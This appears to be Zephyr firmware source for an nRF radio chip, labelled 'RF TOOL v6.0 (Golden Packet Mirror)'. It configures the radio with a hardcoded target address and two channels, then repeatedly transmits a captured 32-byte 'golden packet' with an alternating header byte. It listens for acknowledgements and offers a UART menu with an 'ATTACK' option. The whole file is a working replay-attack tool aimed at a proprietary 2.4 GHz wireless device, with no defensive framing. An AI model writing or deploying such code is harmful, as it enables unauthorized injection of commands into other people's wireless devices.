#include <zephyr/kernel.h>
#include <zephyr/sys/printk.h>
#include <hal/nrf_radio.h>
#include <zephyr/usb/usb_device.h>
#include <zephyr/drivers/gpio.h>
#include <zephyr/drivers/uart.h>
#include <string.h>
#include <stdint.h>

// ================= 參數設定 =================
static const uint8_t TARGET_FREQS[] = {4, 78}; // 2404 & 2478 MHz
#define TARGET_ADDR_BASE   0xd235cf35
#define TARGET_ADDR_PREFIX 0x00

// ================= 數據庫 (你的黃金封包) =================
// Data: 16 00 00 21 20 80 0F AF F0 00 00 C0 0D FF F0 0F CF 00 29 79 10 27 68 D8 2A 88 31 98 23 00 00 00
static uint8_t GOLDEN_PACKET[] = {
    0x16, 0x00, 0x00, 0x21, 0x20, 0x80, 0x0F, 0xAF, 
    0xF0, 0x00, 0x00, 0xC0, 0x0D, 0xFF, 0xF0, 0x0F, 
    0xCF, 0x00, 0x29, 0x79, 0x10, 0x27, 0x68, 0xD8, 
    0x2A, 0x88, 0x31, 0x98, 0x23, 0x00, 0x00, 0x00
};

// ===========================================

#define LED0_NODE DT_ALIAS(led0)
static const struct gpio_dt_spec led = GPIO_DT_SPEC_GET(LED0_NODE, gpios);
const struct device *uart_dev = DEVICE_DT_GET(DT_CHOSEN(zephyr_console));

static uint8_t packet_buffer[64];
static bool attack_active = false;
static bool swap_address = false;

// 反轉地址函數
uint32_t reverse_32(uint32_t n) {
    return ((n>>24)&0xff) | ((n<<8)&0xff0000) | ((n>>8)&0xff00) | ((n<<24)&0xff000000);
}

void radio_init_mirror(void) {
    NRF_RADIO->POWER = 0;
    k_busy_wait(500);
    NRF_RADIO->POWER = 1;
    
    // 最大功率
    NRF_RADIO->TXPOWER = (RADIO_TXPOWER_TXPOWER_Pos8dBm << RADIO_TXPOWER_TXPOWER_Pos);

    // CRC 設定 (必須開啟)
    NRF_RADIO->CRCCNF = (RADIO_CRCCNF_LEN_Two << RADIO_CRCCNF_LEN_Pos);
    NRF_RADIO->CRCPOLY = 0x11021; 
    NRF_RADIO->CRCINIT = 0xFFFF;
    NRF_RADIO->MODE = NRF_RADIO_MODE_BLE_2MBIT; 
    
    // ★★★ 設定為固定長度模式 (Fixed Length) ★★★
    // LFLEN = 0 (不使用長度欄位)
    NRF_RADIO->PCNF0 = (0UL << RADIO_PCNF0_LFLEN_Pos);
    
    // STATLEN = 32 (強制發送/接收 32 Bytes)
    NRF_RADIO->PCNF1 = (32UL << RADIO_PCNF1_STATLEN_Pos) | 
                       (32UL << RADIO_PCNF1_MAXLEN_Pos)  | 
                       (4UL  << RADIO_PCNF1_BALEN_Pos)   | 
                       (1UL  << RADIO_PCNF1_ENDIAN_Pos);
    
    NRF_RADIO->BASE0 = TARGET_ADDR_BASE;
    NRF_RADIO->PREFIX0 = TARGET_ADDR_PREFIX; 
    NRF_RADIO->TXADDRESS = 0; 
    NRF_RADIO->RXADDRESSES = 1; 
}

void send_on_freq(uint8_t freq) {
    // 1. 停用 Radio
    NRF_RADIO->SHORTS = 0;
    NRF_RADIO->TASKS_DISABLE = 1;
    while (NRF_RADIO->EVENTS_DISABLED == 0);
    NRF_RADIO->EVENTS_DISABLED = 0;

    NRF_RADIO->FREQUENCY = freq;
    
    // 地址設定 (正常 vs 反轉)
    if (swap_address) NRF_RADIO->BASE0 = reverse_32(TARGET_ADDR_BASE);
    else NRF_RADIO->BASE0 = TARGET_ADDR_BASE;

    // 2. 準備數據 (自動切換 16/1C)
    static int toggle_cnt = 0;
    GOLDEN_PACKET[0] = (toggle_cnt++ % 2 == 0) ? 0x16 : 0x1C;
    
    memcpy(packet_buffer, GOLDEN_PACKET, 32); 
    NRF_RADIO->PACKETPTR = (uint32_t)packet_buffer;

    // 3. 啟動 Turbo Shortcuts (自動 TX -> RX)
    NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk | 
                        RADIO_SHORTS_END_DISABLE_Msk | 
                        RADIO_SHORTS_DISABLED_RXEN_Msk |
                        RADIO_SHORTS_RXREADY_START_Msk;

    NRF_RADIO->TASKS_TXEN = 1;

    // 4. 等待流程 (TX + T_IFS + ACK)
    k_busy_wait(200); 

    // 5. 檢查 ACK
    int timeout_counter = 2000;
    bool ack_received = false;
    
    while(timeout_counter--) {
        if (NRF_RADIO->EVENTS_END) {
            if (NRF_RADIO->CRCSTATUS == 1) {
                ack_received = true;
            }
            NRF_RADIO->EVENTS_END = 0;
            break; 
        }
        k_busy_wait(1);
    }

    // 清理
    NRF_RADIO->SHORTS = 0;
    NRF_RADIO->TASKS_DISABLE = 1;

    // 回報結果
    if (ack_received) {
        int8_t rssi = -(int8_t)NRF_RADIO->RSSISAMPLE;
        printk(">>> [HIT!] ACK RECEIVED on %d MHz | RSSI: %d\n", 2400+freq, rssi);
        gpio_pin_set_dt(&led, 1);
        k_busy_wait(20000);
        gpio_pin_set_dt(&led, 0);
    }
}

void print_menu() {
    printk("\n\n=== RF TOOL v6.0 (Golden Packet Mirror) ===\n");
    printk(" [1] ATTACK: Send Captured Packet (32 Bytes)\n");
    printk(" [6] Toggle Address Swap (Current: %s)\n", swap_address ? "SWAPPED" : "NORMAL");
    printk(" [0] STOP\n");
    printk("----------------------------------------\n");
    printk(" Current: %s\n", attack_active ? "FIRING" : "IDLE");
}

void uart_cb(const struct device *dev, void *user_data) {
    uint8_t c;
    if (!uart_irq_update(dev)) return;
    if (!uart_irq_rx_ready(dev)) return;

    while (uart_fifo_read(dev, &c, 1) == 1) {
        switch (c) {
            case '1':
                attack_active = true;
                printk("\n>>> FIRING GOLDEN PACKET...\n");
                break;
            case '6':
                swap_address = !swap_address;
                printk("\n>>> ADDRESS SWAP: %s <<<\n", swap_address ? "ON" : "OFF");
                break;
            case '0':
                attack_active = false;
                printk("\n>>> STOPPED <<<\n");
                break;
            default:
                print_menu();
                break;
        }
    }
}

int main(void) {
    usb_enable(NULL);
    if (device_is_ready(led.port)) gpio_pin_configure_dt(&led, GPIO_OUTPUT_ACTIVE);
    
    uart_irq_callback_user_data_set(uart_dev, uart_cb, NULL);
    uart_irq_rx_enable(uart_dev);

    radio_init_mirror(); 
    k_sleep(K_SECONDS(2));
    print_menu();

    int freq_idx = 0;

    while (1) {
        if (attack_active) {
            send_on_freq(TARGET_FREQS[freq_idx]);
            freq_idx = (freq_idx + 1) % 2; 
        } else {
            gpio_pin_toggle_dt(&led);
            k_sleep(K_MSEC(500));
        }
    }
}
